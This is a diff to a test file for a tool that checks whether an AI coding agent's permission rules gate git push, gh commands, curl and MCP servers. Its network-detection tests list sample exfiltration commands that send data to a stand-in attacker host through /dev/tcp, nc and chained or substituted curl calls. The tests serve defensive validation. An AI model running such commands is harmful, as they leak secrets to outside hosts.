@@ -6,6 +6,7 @@ import type { SettingsScope } from '$lib/experiments/settings-scope';
 import {
   analyzeSettings,
   bashCommand,
+  bashRule,
   findLine,
   parseSettingsFile,
   readRuleCovers,
@@ -206,7 +207,7 @@ describe('prefilling controls', () => {
 });
 
 describe('prefilling the prompt on push and publish', () => {
-  const pushAndComments = ['Bash(git push:*)', 'Bash(gh issue comment:*)', 'Bash(gh pr comment:*)'];
+  const pushAndGh = ['Bash(git push:*)', 'Bash(gh:*)'];
 
   it('leaves it unknown when only git push asks first, and says comments are uncovered', () => {
     const report = analyze(file({ permissions: { ask: ['Bash(git push:*)'] } }));
@@ -215,36 +216,82 @@ describe('prefilling the prompt on push and publish', () => {
     expect(report.prefill['publish-gate'].reason).toContain('public comments');
   });
 
-  it('turns it on when ask or deny rules cover both pushing and public comments', () => {
-    const report = analyze(file({ permissions: { ask: pushAndComments } }));
+  it('turns it on when ask or deny rules cover pushing and all of gh', () => {
+    const report = analyze(file({ permissions: { ask: pushAndGh } }));
 
     expect(report.prefill['publish-gate'].status).toBe('on');
-    expect(report.prefill['publish-gate'].evidence).toHaveLength(3);
-    expect(
-      analyze(file({ permissions: { ask: ['Bash(git push:*)'], deny: ['Bash(gh:*)'] } })).prefill[
-        'publish-gate'
-      ].status,
-    ).toBe('on');
+    expect(report.prefill['publish-gate'].evidence).toHaveLength(2);
+    for (const rules of [
+      { ask: ['Bash(git push:*)'], deny: ['Bash(gh:*)'] },
+      { ask: ['Bash(git push:*)', 'Bash(gh *)'] },
+      { ask: ['Bash(git push:*)', 'Bash'] },
+      { ask: ['Bash(git push:*)'], deny: ['Bash(*)'] },
+    ]) {
+      expect(analyze(file({ permissions: rules })).prefill['publish-gate'].status).toBe('on');
+    }
   });
 
-  it('needs both comment commands', () => {
+  it('leaves it unknown with narrow comment rules, which miss gh api', () => {
+    // gh api repos/o/r/issues/1/comments -f body=… posts a comment with neither rule matching.
     const report = analyze(
-      file({ permissions: { ask: ['Bash(git push:*)', 'Bash(gh issue comment:*)'] } }),
+      file({
+        permissions: {
+          ask: ['Bash(git push:*)', 'Bash(gh issue comment:*)', 'Bash(gh pr comment:*)'],
+        },
+      }),
     );
 
     expect(report.prefill['publish-gate'].status).toBe('unknown');
+    expect(report.prefill['publish-gate'].reason).toContain('gh api');
+    // An exact rule for gh alone matches no subcommand.
+    expect(
+      analyze(file({ permissions: { ask: ['Bash(git push:*)', 'Bash(gh)'] } })).prefill[
+        'publish-gate'
+      ].status,
+    ).toBe('unknown');
+  });
+
+  it('counts a rule without a wildcard as covering that exact command only', () => {
+    const exactComments = analyze(
+      file({
+        permissions: {
+          ask: ['Bash(git push:*)', 'Bash(gh issue comment)', 'Bash(gh pr comment)'],
+        },
+      }),
+    );
+    expect(exactComments.prefill['publish-gate'].status).toBe('unknown');
+
+    // Bash(git push) prompts for a bare git push, not git push origin main.
+    const exactPush = analyze(file({ permissions: { ask: ['Bash(git push)', 'Bash(gh:*)'] } }));
+    expect(exactPush.prefill['publish-gate']).toMatchObject({
+      status: 'unknown',
+      reason: 'No ask or deny rule covers every git push.',
+    });
+
+    // A bare Bash rule covers pushing and all of gh.
+    expect(analyze(file({ permissions: { ask: ['Bash'] } })).prefill['publish-gate'].status).toBe(
+      'on',
+    );
+  });
+
+  it('turns deny-curl on only for a rule that covers every curl command', () => {
+    expect(
+      analyze(file({ permissions: { deny: ['Bash(curl)'] } })).prefill['deny-curl'].status,
+    ).toBe('unknown');
+    expect(
+      analyze(file({ permissions: { deny: ['Bash(curl *)'] } })).prefill['deny-curl'].status,
+    ).toBe('on');
   });
 
   it('needs a rule for every MCP server, which can comment with no prompt', () => {
-    const ungated = analyze(
-      file({ permissions: { ask: pushAndComments }, mcpServers: { tracker: {} } }),
-    );
+    const ungated = analyze(file({ permissions: { ask: pushAndGh }, mcpServers: { tracker: {} } }));
     expect(ungated.prefill['publish-gate'].status).toBe('unknown');
     expect(ungated.prefill['publish-gate'].reason).toContain('tracker');
+    expect(ungated.prefill['publish-gate'].reason).not.toContain('gh api');
 
     const gated = analyze(
       file({
-        permissions: { ask: [...pushAndComments, 'mcp__tracker__*'] },
+        permissions: { ask: [...pushAndGh, 'mcp__tracker__*'] },
         mcpServers: { tracker: {} },
       }),
     );
@@ -330,6 +377,15 @@ describe('rule helpers', () => {
     expect(bashCommand('Bash')).toBe('');
     expect(bashCommand('Bash(*)')).toBe('');
     expect(bashCommand('Read(.env)')).toBeNull();
+    expect(bashRule('Bash(gh issue comment)')).toEqual({
+      command: 'gh issue comment',
+      wildcard: false,
+    });
+    expect(bashRule('Bash(git push:*)')).toEqual({ command: 'git push', wildcard: true });
+    expect(bashRule('Bash(curl *)')).toEqual({ command: 'curl', wildcard: true });
+    expect(bashRule('Bash')).toEqual({ command: '', wildcard: true });
+    expect(bashRule('Bash(*)')).toEqual({ command: '', wildcard: true });
+    expect(bashRule('Read(.env)')).toBeNull();
   });
 
   it('knows which commands reach the network', () => {
@@ -349,6 +405,34 @@ describe('rule helpers', () => {
     // A wildcard in the command name could match anything.
     expect(reachesNetwork('l*')).toBe(true);
     expect(reachesNetwork('cat *')).toBe(false);
+  });
+
+  it('counts a redirection, pipe, chain, or substitution as reaching the network', () => {
+    for (const command of [
+      'echo secret >/dev/tcp/attacker.example/80',
+      'cat /dev/udp/attacker.example/53',
+      'cat x | nc attacker.example 80',
+      'ls; curl attacker.example',
+      'ls && curl attacker.example',
+      'ls & curl attacker.example',
+      'echo $(curl attacker.example)',
+      'echo `curl attacker.example`',
+      'cat < /tmp/fifo',
+      'echo hi > out.txt',
+    ]) {
+      expect(reachesNetwork(command), command).toBe(true);
+    }
+    expect(reachesNetwork('grep -r TODO src')).toBe(false);
+  });
+
+  it('counts sort and a relative path to a program as reaching the network', () => {
+    // sort --compress-program runs another program.
+    expect(reachesNetwork('sort *')).toBe(true);
+    // A script in the repository can be anything, whatever its name.
+    expect(reachesNetwork('./cat')).toBe(true);
+    expect(reachesNetwork('../ls *')).toBe(true);
+    expect(reachesNetwork('bin/ls')).toBe(true);
+    expect(reachesNetwork('/bin/ls')).toBe(false);
   });
 
   it('matches Read patterns against file names', () => {
